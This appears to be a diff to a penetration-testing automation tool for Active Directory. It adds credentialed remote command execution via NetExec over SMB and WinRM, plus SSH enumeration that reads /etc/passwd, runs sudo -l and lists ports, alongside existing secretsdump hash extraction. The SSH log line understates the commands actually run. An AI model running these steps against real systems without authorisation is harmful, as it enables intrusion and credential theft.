@@ -126,6 +126,33 @@ def _validate_smb(
 
 # ── AD Core ───────────────────────────────────────────────────────────────────
 
+def _smb_admin_exec(
+    ip: str, domain: str, user: str, pw: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> None:
+    """Run standard Windows enumeration commands via SMB exec (requires admin / Pwn3d! access)."""
+    if "nxc" not in available:
+        return
+    findings.h4(f"Admin Command Execution — {user}")
+    print(f"    [*] SMB admin exec as {user}...")
+    smb_cmds = [
+        ("whoami /all",                                                                      f"creds_smb_exec_whoami_{user}"),
+        ("net localgroup administrators",                                                    f"creds_smb_exec_localadmins_{user}"),
+        ('net group "Domain Admins" /domain',                                               f"creds_smb_exec_domainadmins_{user}"),
+        ("ipconfig /all",                                                                    f"creds_smb_exec_ipconfig_{user}"),
+        ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"', f"creds_smb_exec_sysinfo_{user}"),
+    ]
+    for smb_cmd, label in smb_cmds:
+        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw]
+        if domain:
+            cmd += ["-d", domain]
+        cmd += ["-x", smb_cmd]
+        findings.cmd(f"nxc smb {ip} -u {user} -p *** -x \"{smb_cmd}\"")
+        out = runner.run(cmd, label, timeout=30)
+        findings.code_block(_trim(out))
+    print(f"    [+] Admin exec complete")
+
+
 def _ad_core(
     ip: str,
     domain: str,
@@ -296,7 +323,12 @@ def _ad_core(
         else:
             print(f"    [-] No vulnerable ADCS templates")
 
-    # 6. secretsdump — extract NTLM hashes (requires admin/DA credentials)
+    # 6a. Admin command execution — enumerate target via SMB exec using admin creds
+    if admin_smb:
+        admin_user, admin_pw = admin_smb[0]
+        _smb_admin_exec(ip, domain, admin_user, admin_pw, runner, findings, ws, available)
+
+    # 6b. secretsdump — extract NTLM hashes (requires admin/DA credentials)
     if "impacket-secretsdump" in available and admin_smb:
         admin_user, admin_pw = admin_smb[0]
         cmd = [
@@ -384,10 +416,17 @@ def _creds_winrm(
         ws.add_valid_cred(user, pw, f"WinRM:{port}")
         findings.add_summary(f"WinRM access: `{user}` on port {port}")
         print(f"      [+] {user}: WinRM:{port} valid")
-        for safe_cmd in ["whoami", "hostname"]:
-            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-x", safe_cmd]
-            findings.cmd(" ".join(cmd2))
-            out2 = runner.run(cmd2, f"creds_winrm_{safe_cmd}_{user}", timeout=20)
+        win_cmds = [
+            ("whoami /all",                                                                      f"creds_winrm_whoami_all_{user}"),
+            ("net localgroup administrators",                                                    f"creds_winrm_localadmins_{user}"),
+            ('net group "Domain Admins" /domain',                                               f"creds_winrm_domainadmins_{user}"),
+            ("ipconfig /all",                                                                    f"creds_winrm_ipconfig_{user}"),
+            ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"', f"creds_winrm_sysinfo_{user}"),
+        ]
+        for win_cmd, label in win_cmds:
+            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-x", win_cmd]
+            findings.cmd(f"nxc winrm {ip} -u {user} -p *** -x \"{win_cmd}\"")
+            out2 = runner.run(cmd2, label, timeout=30)
             findings.code_block(_trim(out2))
     else:
         print(f"      [-] {user}: WinRM:{port} invalid")
@@ -407,7 +446,13 @@ def _creds_ssh(
         "-o", "PasswordAuthentication=yes",
         "-p", str(port),
         f"{user}@{ip}",
-        "whoami; hostname; id",
+        (
+            "whoami; id; hostname; uname -a 2>/dev/null; "
+            "cat /etc/os-release 2>/dev/null | head -3; "
+            "sudo -l 2>/dev/null; "
+            "cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync 2>/dev/null; "
+            "ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20"
+        ),
     ]
     findings.cmd(f"sshpass -p *** ssh -p {port} {user}@{ip} 'whoami; hostname; id'")
     out = runner.run(full_cmd, f"creds_ssh_{user}", timeout=20)
